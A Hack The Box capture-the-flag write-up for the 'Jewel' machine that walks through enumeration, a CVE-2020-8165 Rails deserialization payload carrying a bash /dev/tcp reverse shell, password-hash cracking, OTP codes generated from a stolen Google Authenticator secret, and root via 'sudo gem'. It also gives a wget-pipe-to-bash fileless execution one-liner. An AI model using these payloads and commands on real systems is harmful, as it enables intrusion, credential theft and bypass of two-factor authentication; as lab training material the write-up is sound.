---
title: "Jewel"
difficulty: Medium
os: Linux
points: 30
rating: 3.6
date: 2020-10-10
avatar: assets/htb/jewel.png
htb_url: https://app.hackthebox.com/machines/Jewel
---

## Useful Skills and Tools

### Execute a shell script payload without writing to disk

```bash
wget -O - -q $url:$port/$file | bash
```

* don't forget that trailing \(`-`\), it matters!

## Enumeration

### Nmap scan

I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (same as `--script=default`) to fire the default NSE enumeration scripts at the host, `-sV` for service/version detection, and `-oA <name>` to dump the results to files named `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ nmap -sCV -n -p- -Pn -v -oA jewel <YOUR_IP>                                                130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-13 20:56 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:56
Completed NSE at 20:56, 0.00s elapsed
Initiating NSE at 20:56
Completed NSE at 20:56, 0.00s elapsed
Initiating NSE at 20:56
Completed NSE at 20:56, 0.00s elapsed
Initiating Connect Scan at 20:56
Scanning <YOUR_IP> [65535 ports]
Discovered open port 8080/tcp on <YOUR_IP>
Discovered open port 22/tcp on <YOUR_IP>
Connect Scan Timing: About 17.74% done; ETC: 20:58 (0:02:24 remaining)
Connect Scan Timing: About 41.92% done; ETC: 20:58 (0:01:25 remaining)
Connect Scan Timing: About 65.74% done; ETC: 20:58 (0:00:47 remaining)
Discovered open port 8000/tcp on <YOUR_IP>
Completed Connect Scan at 20:58, 125.55s elapsed (65535 total ports)
Initiating Service scan at 20:58
Scanning 3 services on <YOUR_IP>
Completed Service scan at 20:58, 11.25s elapsed (3 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 20:58
Completed NSE at 20:58, 2.77s elapsed
Initiating NSE at 20:58
Completed NSE at 20:58, 0.33s elapsed
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.076s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: <YOUR_IP> Git
|_Requested resource was http://<YOUR_IP>:8000/gitweb/
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.32 seconds
```

The scan turned up just three open ports: 22 - SSH, 8000 - HTTP, and 8080 - HTTP.

### Port 8080 - HTTP

![](assets/wu/jewel/img-1.png)

Port 8080 served a "Bl0g" site. Reading through the posts, I picked out two likely usernames: `bill` and `jennifer`. 

![](assets/wu/jewel/img-2.png)

registered an account and logged in. 

![](assets/wu/jewel/img-3.png)

The profile page had an 'edit profile' link. I was hoping for an image upload field, but the only thing I could change was the username.

### Port 8000 - HTTP

![](assets/wu/jewel/img-4.png)

Port 8000 hosted a gitweb page for the "Bl0g".

![](assets/wu/jewel/img-5.png)

file tree

![](assets/wu/jewel/img-6.png)

The `Gemfile` listed version numbers for every dependency in the project, including the Ruby on Rails framework version.

![](assets/wu/jewel/img-7.png)

browsing the git source, I spotted a couple of password hashes inside the file bd.sql

![](assets/wu/jewel/img-8.png)

I grabbed the site's source by clicking the `snapshot` link. Examining the SQL dump locally turned up nothing else of value, and neither did the rest of the code.

```text
COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
+1      bill    bill@mail.htb   2020-08-25 08:13:58.662464      2020-08-25 08:13:58.662464      $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+2      jennifer        jennifer@mail.htb       2020-08-25 08:54:42.8483        2020-08-25 08:54:42.8483        $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
+\.
```

It also exposed the users' email addresses, which use the `mail.htb` domain.

As I researched the various version numbers, I came across an exploit for this git version, though it appeared to be Windows-only.

* [https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html](https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html)

Back in the `Gemfile` I had noted Rails 5.2.2.1. Searching for vulnerabilities in that release surfaced several relevant CVEs:

* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267)

Hunting for exploits against each CVE, I landed on a PoC for CVE-2020-8165.

* [https://www.cvebase.com/cve/2020/8165](https://www.cvebase.com/cve/2020/8165)

cvebase listed eight PoCs for this CVE, which looked promising. I picked the highest-voted one, which pointed me to a GitHub repo.

* [https://github.com/masahiro331/CVE-2020-8165](https://github.com/masahiro331/CVE-2020-8165)

The steps seemed straightforward, but Rails wasn't installed yet, so I handled that first. Then I spun up a new project called `test`. \(I had to rename it to `testing`, since 'test' turns out to be a reserved keyword in ruby/rails.\)

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ rails new testing             
      create  
      create  README.md
      create  Rakefile
      create  .ruby-version
      create  config.ru
      create  .gitignore
      create  Gemfile
         run  git init from "."
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/kac0/htb/jewel/exploit/.git/
      create  package.json
      create  app
      create  app/assets/config/manifest.js
      create  app/assets/stylesheets/application.css
      create  app/channels/application_cable/channel.rb
      create  app/channels/application_cable/connection.rb
      create  app/controllers/application_controller.rb
      create  app/helpers/application_helper.rb
      create  app/javascript/channels/consumer.js
      create  app/javascript/channels/index.js
      create  app/javascript/packs/application.js
      create  app/jobs/application_job.rb
      create  app/mailers/application_mailer.rb
      create  app/models/application_record.rb
      create  app/views/layouts/application.html.erb
      create  app/views/layouts/mailer.html.erb
      create  app/views/layouts/mailer.text.erb
      create  app/assets/images
      create  app/assets/images/.keep
      create  app/controllers/concerns/.keep
      create  app/models/concerns/.keep
      create  bin
      create  bin/rails
      create  bin/rake
      create  bin/setup
      create  bin/yarn
      create  config
      create  config/routes.rb
      create  config/application.rb
      create  config/environment.rb
      create  config/cable.yml
      create  config/puma.rb
      create  config/spring.rb
      create  config/storage.yml
      create  config/environments
      create  config/environments/development.rb
      create  config/environments/production.rb
      create  config/environments/test.rb
      create  config/initializers
      create  config/initializers/application_controller_renderer.rb
      create  config/initializers/assets.rb
      create  config/initializers/backtrace_silencers.rb
      create  config/initializers/content_security_policy.rb
      create  config/initializers/cookies_serializer.rb
      create  config/initializers/cors.rb
      create  config/initializers/filter_parameter_logging.rb
      create  config/initializers/inflections.rb
      create  config/initializers/mime_types.rb
      create  config/initializers/new_framework_defaults_6_0.rb
      create  config/initializers/wrap_parameters.rb
      create  config/locales
      create  config/locales/en.yml
      create  config/master.key
      append  .gitignore
      create  config/boot.rb
      create  config/database.yml
      create  db
      create  db/seeds.rb
      create  lib
      create  lib/tasks
      create  lib/tasks/.keep
      create  lib/assets
      create  lib/assets/.keep
      create  log
      create  log/.keep
      create  public
      create  public/404.html
      create  public/422.html
      create  public/500.html
      create  public/apple-touch-icon-precomposed.png
      create  public/apple-touch-icon.png
      create  public/favicon.ico
      create  public/robots.txt
      create  tmp
      create  tmp/.keep
      create  tmp/pids
      create  tmp/pids/.keep
      create  tmp/cache
      create  tmp/cache/assets
      create  vendor
      create  vendor/.keep
      create  test/fixtures
      create  test/fixtures/.keep
      create  test/fixtures/files
      create  test/fixtures/files/.keep
      create  test/controllers
      create  test/controllers/.keep
      create  test/mailers
      create  test/mailers/.keep
      create  test/models
      create  test/models/.keep
      create  test/helpers
      create  test/helpers/.keep
      create  test/integration
      create  test/integration/.keep
      create  test/channels/application_cable/connection_test.rb
      create  test/test_helper.rb
      create  test/system
      create  test/system/.keep
      create  test/application_system_test_case.rb
      create  storage
      create  storage/.keep
      create  tmp/storage
      create  tmp/storage/.keep
      remove  config/initializers/cors.rb
      remove  config/initializers/new_framework_defaults_6_0.rb
         run  bundle install --local
Could not find gem 'rails (~> 6.0.3, >= 6.0.3.4)' in any of the gem sources listed in your Gemfile.
         run  bundle binstubs bundler
Could not find gem 'rails (~> 6.0.3, >= 6.0.3.4)' in any of the gem sources listed in your Gemfile.
         run  bundle exec spring binstub --all
Could not find gem 'rails (~> 6.0.3, >= 6.0.3.4)' in any of the gem sources listed in your Gemfile.
Run `bundle install` to install missing gems.
       rails  webpacker:install
Could not find gem 'rails (~> 6.0.3, >= 6.0.3.4)' in any of the gem sources listed in your Gemfile.
Run `bundle install` to install missing gems.

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ cd testing

┌──(kac0㉿kali)-[~/htb/jewel/exploit]
└─$ bundle install                                                                                                                                                                                            7 ⨯
Fetching gem metadata from https://rubygems.org/............
Fetching gem metadata from https://rubygems.org/.
Resolving dependencies....
Fetching rake 
Installing rake 

...snipped...
```

Once Rails was in place and the project was created, I hit errors about missing dependencies, so I ran `bundle install` to pull those in as well. It installed a long list of gems. 

If more errors come up, read them carefully and do what they say. They're usually descriptive enough to tell you exactly how to fix the issue.

I ran into plenty of dependency headaches involving yarn, webpacker, rails, and others...

* [https://github.com/rails/webpacker/issues/818](https://github.com/rails/webpacker/issues/818)

```text
┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ bundle clean                    

┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ which yarn
/usr/local/bin/yarn

┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ sudo gem uninstall -aIx yarn
Removing yarn
Successfully uninstalled yarn-0.1.1

┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ sudo npm install --global yarn

added 1 package, and audited 2 packages in 1s

found 0 vulnerabilities

┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ rails webpacker:install       
      create  config/webpacker.yml
Copying webpack core config
```

The steps above cleared up the webpacker problems. The gem-installed yarn was somehow the culprit, so I uninstalled it and reinstalled yarn via npm. 

```text
┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ rails c                
Loading development environment (Rails 6.0.3.5)
irb(main):001:0>
```

With every dependency sorted out, the rails console finally launched.

```ruby
┌──(kac0㉿kali)-[~/htb/jewel/testing]
└─$ rails c                
Loading development environment (Rails 6.0.3.5)
irb(main):001:0> code = '`bash -c "bash -i >& /dev/tcp/10.10.15.13/8099 0>&1"`'
=> "`bash -c \"bash -i >& /dev/tcp/10.10.15.13/8099 0>&1\"`"
irb(main):002:0> erb = ERB.allocate
=> #<ERB:0x000055d8ee5731a0>
irb(main):003:0> erb.instance_variable_set :@src, code
=> "`bash -c \"bash -i >& /dev/tcp/10.10.15.13/8099 0>&1\"`"
irb(main):004:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):005:0> erb.instance_variable_set :@lineno, 1
=> 1
irb(main):006:0> payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
=> "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\":`bash -c \"bash -i >& /dev/tcp/10.10.15.13/8099 0>&1\"`\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:...
irb(main):009:0> require 'uri'
=> false
irb(main):010:0> puts URI.encode_www_form(payload: payload)
payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3A%60bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.15.13%2F8099+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
=> nil
irb(main):011:0>quit()
```

After all that setup, generating the payload by following the PoC was straightforward.  

![](assets/wu/jewel/img-9.png)

I intercepted the username-change request from the 'edit profile' page in Burp and swapped my payload into the username field

![](assets/wu/jewel/img-10.png)

The edit profile page returned an error after I submitted the payload in the username field, but it executed anyway.

## Initial Foothold

```text
kac0@kali:~/htb/jewel$ script
Script started, output log file is 'typescript'.
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ bash      
kac0@kali:~/htb/jewel$ nc -lvnp 8099
listening on [any] 8099 ...
connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 40016
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
bill@jewel:~/blog$
```

Once the payload was sent and I issued another GET request for the profile page, my waiting netcat listener caught a connection. I used `script` to record a transcript of everything I was about to run in the shell, and I ran the listener under bash instead of `zsh`, because `zsh` misbehaves with `stty raw -echo` during shell upgrades.

```text
bill@jewel:~/blog$ which python3
which python3
/usr/bin/python3
bill@jewel:~/blog$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bill@jewel:~/blog$ ^Z
[1]+  Stopped                 nc -lvnp 8099
kac0@kali:~/htb/jewel$ stty raw -echo
nc -lvnp 8099:~/htb/jewel$ 

bill@jewel:~/blog$ export TERM=xterm-256color
bill@jewel:~/blog$
```

I upgraded the shell to regain `ctrl-c`, command history via the arrow keys, and so on.

```text
bill@jewel:~$ id && hostname
uid=1000(bill) gid=1000(bill) groups=1000(bill)
jewel.htb
```

I was running as bill, with no notable group memberships

```text
bill@jewel:~/blog$ cd /home
bill@jewel:/home$ ls
bill
bill@jewel:/home$ cd bill/
bill@jewel:~$ ls -la
total 52
drwxr-xr-x  6 bill bill 4096 Sep 17 14:10 .
drwxr-xr-x  3 root root 4096 Aug 26 09:32 ..
lrwxrwxrwx  1 bill bill    9 Aug 27 11:26 .bash_history -> /dev/null
-rw-r--r--  1 bill bill  220 Aug 26 09:32 .bash_logout
-rw-r--r--  1 bill bill 3526 Aug 26 09:32 .bashrc
drwxr-xr-x 15 bill bill 4096 Sep 17 17:16 blog
drwxr-xr-x  3 bill bill 4096 Aug 26 10:33 .gem
-rw-r--r--  1 bill bill   43 Aug 27 10:53 .gitconfig
drwx------  3 bill bill 4096 Aug 27 05:58 .gnupg
-r--------  1 bill bill   56 Aug 28 07:00 .google_authenticator
drwxr-xr-x  3 bill bill 4096 Aug 27 10:54 .local
-rw-r--r--  1 bill bill  807 Aug 26 09:32 .profile
lrwxrwxrwx  1 bill bill    9 Aug 27 11:26 .rediscli_history -> /dev/null
-r--------  1 bill bill   33 Feb 14 14:27 user.txt
-rw-r--r--  1 bill bill  116 Aug 26 10:43 .yarnrc
```

`bill`'s home directory held a few interesting hidden files, notably `.google_authenticator`.

### User.txt

```text
bill@jewel:~$ cat user.txt 
9688************************83b2
```

Nice to see the `user.txt` flag sitting right in `bill`'s home directory!

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `bill`

```text
[+] Searching specific hashes inside files - less false positives (limit 70)
/var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO          
/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
```

linpeas flagged a couple of files containing password hashes. The second was the one I'd already failed to crack, but the first was new to me. Living in a backups folder, it could well be an old password reused somewhere else

![](assets/wu/jewel/img-11.png)

I transferred the backup SQL file to my box and opened it. It held a couple of new hashes, which I fed into hashcat to crack.

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ hashcat -O -D1,2 -a0 -m3200 --username hash_backup  /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

Kernel /usr/share/hashcat/OpenCL/m03200-optimized.cl:
Optimized kernel requested but not needed - falling back to pure kernel

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Failed to parse hashes using the 'native hashcat' format.
Failed to parse hashes using the 'native hashcat' format.
No hashes loaded.

Started: Sun Feb 14 18:04:00 2021
Stopped: Sun Feb 14 18:04:00 2021

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ hash-identifier                                                                              255 ⨯
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW

 Not Found.
--------------------------------------------------
 HASH: ^C

        Bye!

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_backup
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob        (?)
```

hashcat refused to recognize the backup hashes as valid bcrypt for some reason, but `john` cracked one of them almost instantly.

```text
bill@jewel:/var/backups$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
bill:x:1000:1000:,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
postgres:x:108:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
redis:x:109:116::/var/lib/redis:/usr/sbin/nologin
```

Checking `/etc/passwd` for other accounts, I saw that only `bill`, `postgres`, and `root` had login shells.

```text
bill@jewel:/var/backups$ sudo -l
[sudo] password for bill: 
Verification code: 
I fart in your general direction!
[sudo] password for bill: 
I fart in your general direction!
[sudo] password for bill: 
sudo: 3 incorrect password attempts
```

That password turned out to be `bill`'s. With the password in hand I tried `sudo -l` again, but now it prompted for a verification code, almost certainly tied to the `.google-authenticator` file in `bill`'s home folder.

* [https://github.com/google/google-authenticator-libpam](https://github.com/google/google-authenticator-libpam)

> Run the google-authenticator binary to create a new secret key in your home directory. These settings will be stored in ~/.google\_authenticator.

```text
bill@jewel:~$ google-authenticator 

Do you want authentication tokens to be time-based (y/n) n
Warning: pasting the following URL into your browser exposes the OTP secret to Google:
  https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://hotp/bill@jewel.htb%3Fsecret%3DJ5B3HMXHBC3IYW54L7HI6FIY7E%26issuer%3Djewel.htb

...qr code would be here...it didn't copy for some reason, though...                            

Your new secret key is: J5B3HMXHBC3IYW54L7HI6FIY7E
Your verification code is 983076
Your emergency scratch codes are:
  78936844
  50472226
  37399849
  28773354
  23422974

Do you want me to update your "/home/bill/.google_authenticator" file? (y/n) y

By default, three tokens are valid at any one time.  This accounts for
generated-but-not-used tokens and failed login attempts. In order to
decrease the likelihood of synchronization problems, this window can be
increased from its default size of 3 to 17. Do you want to do so? (y/n) y

If the computer that you are logging into isn't hardened against brute-force
login attempts, you can enable rate-limiting for the authentication module.
By default, this limits attackers to no more than 3 login attempts every 30s.
Do you want to enable rate-limiting? (y/n) n
Failed to write new secret: Operation not permitted

bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code: 
You must cut down the mightiest tree in the forest... with... a herring!
[sudo] password for bill: 
Verification code: 
Pauses for audience applause, not a sausage
[sudo] password for bill: 
Verification code: 
sudo: 3 incorrect password attempts
```

I couldn't set up a fresh google authenticator \(and clearly somebody is a Monty Python fan...\)

```text
bill@jewel:~$ cat .google_authenticator 
2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH
```

* [https://wiki.archlinux.org/index.php/Google\_Authenticator](https://wiki.archlinux.org/index.php/Google_Authenticator)

> The easiest way to generate codes is with oath-tool. It is available in the oath-toolkit package, and can be used as follows: `oathtool --totp -b ABC123` Where ABC123 is the secret key.

I installed `oathtool` and tried generating a TOTP from the secret I'd found, but my OTP kept being rejected; I realized the box was on GMT while my system wasn't.

```text
bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code: 
Error "Operation not permitted" while writing config
I fart in your general direction!
[sudo] password for bill: 
Verification code: 
Error "Operation not permitted" while writing config
This man, he doesn't know when he's beaten! He doesn't know when he's winning, either. He has no... sort of... sensory apparatus...
```

Switching my system to GMT produced a different error. The two clocks were still a few minutes apart, which was probably still tripping me up, so I looked for a way to sync the times between them

* [https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers](https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers)

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ remote_time=`ssh -i jewel bill@<YOUR_IP> date` && date -s $remote_time
date: invalid date ‘Mon 15 Feb 00:51:59 GMT 2021’
```

Unfortunately, not only did the time zones differ, the date/time format did too, so I couldn't sync automatically over SSH.

After fiddling with matching the times, I realized both the time zone and the date were off.

* [https://unix.stackexchange.com/questions/110522/timezone-setting-in-linux](https://unix.stackexchange.com/questions/110522/timezone-setting-in-linux)

> NOTE: There's also this option in Ubuntu 14.04 and higher with a single command \(source: Ask Ubuntu - setting timezone from terminal\): `$ sudo timedatectl set-timezone Etc/GMT-6` 
>
> ...you should be using a fully named time zone like America/New\_York or Europe/London or whatever is appropriate for your location...

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ sudo timedatectl set-timezone Europe/London
[sudo] password for kac0: 

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ date
Sun 14 Feb 2021 07:27:42 PM GMT

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ sudo date -s "02:28:50 AM"                                                                     1 ⨯
Sun 14 Feb 2021 02:28:50 AM GMT

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ sudo date -s "Mon 15 Feb" 
Mon 15 Feb 2021 12:00:00 AM GMT

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ sudo date -s "02:29:15 AM"
[sudo] password for kac0: 
Mon 15 Feb 2021 02:29:15 AM GMT
```

With the clocks finally aligned, I could at last see the output of `sudo -l`:

```text
bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code: 
Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

After all the OTP hassle, it was great to actually get a result! I then looked up how to escalate privileges via `sudo gem` and found the technique on GTFObins.

* [https://gtfobins.github.io/gtfobins/gem/](https://gtfobins.github.io/gtfobins/gem/)

> This requires the name of an installed gem to be provided \(rdoc is usually installed\). `gem open -e "/bin/sh -c /bin/sh" rdoc`

### Getting a root shell

```text
bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
jewel.htb
```

Running the GTFObins command under `sudo` dropped me straight into a root shell. It occurred to me that being able to read the sudoers file earlier would have spared me all the OTP pain. I wasn't sure why no code was demanded this time, unless I was still within an authenticated window, so I logged out to check.

```text
bill@jewel:~$ less /etc/sudoers
/etc/sudoers: Permission denied
```

I'd forgotten to check this file before, but I was a bit relieved that all the effort syncing the date and time hadn't been wasted.

```text
┌──(kac0㉿kali)-[~/htb/jewel]
└─$ oathtool --totp -b 2UQI3R52WFCLE6JTLDCSJYMJH4
509498

┌──(kac0㉿kali)-[~/htb/jewel]
└─$ oathtool --totp -b 2UQI3R52WFCLE6JTLDCSJYMJH4
695810
bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
[sudo] password for bill: 
Verification code: 
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

I was right. There's a grace window during which `sudo` lets you run commands without re-authenticating.

### Root.txt

```text
# ls -la
total 12
drwxr-xr-x 3 root root 4096 Aug 26 09:34 .
drwxr-xr-x 3 root root 4096 Aug 26 09:34 ..
drwxr-xr-x 2 root root 4096 Aug 26 09:35 exe
# pwd
/usr/lib/ruby/gems/2.5.0/gems/rdoc-6.0.1
# cd ~
# ls
root.txt
# cat root.txt
ccd6************************0448
```
